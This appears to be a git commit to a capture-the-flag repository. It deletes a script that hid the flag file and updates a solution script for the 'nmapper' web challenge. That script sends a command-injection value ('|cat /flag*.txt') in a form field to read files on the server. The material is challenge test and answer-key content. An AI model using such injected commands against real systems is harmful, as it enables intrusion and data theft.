ac43961aaf2e37927838228c0e002be63687b880
Evangelos Lioudakis <elioudakis123@gmail.com>
2024-07-04 21:22:51 +0300

    web(RCE challs): State flag location in the description of all challenges with RCE

--- web/flask-master/setup/entrypoint.sh
+++
@@ -1,4 +0,0 @@
-#!/bin/bash
-# I will hide the flag well so you can't find it
-cp /flag.txt /flag-$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 16 | head -n 1).txt
-rm /flag.txt
--- web/nmapper/solution/sol.py
+++ web/nmapper/solution/sol.py
@@ -4,5 +4,5 @@ import sys
 s = requests.Session()
 url = sys.argv[1] if len(sys.argv) > 1 else 'http://localhost:1337'
 
-r = s.post(url + "/nmap", data={"target": "|cat flag.txt"})
+r = s.post(url + "/nmap", data={"target": "|cat /flag*.txt"})
 print(r.text)
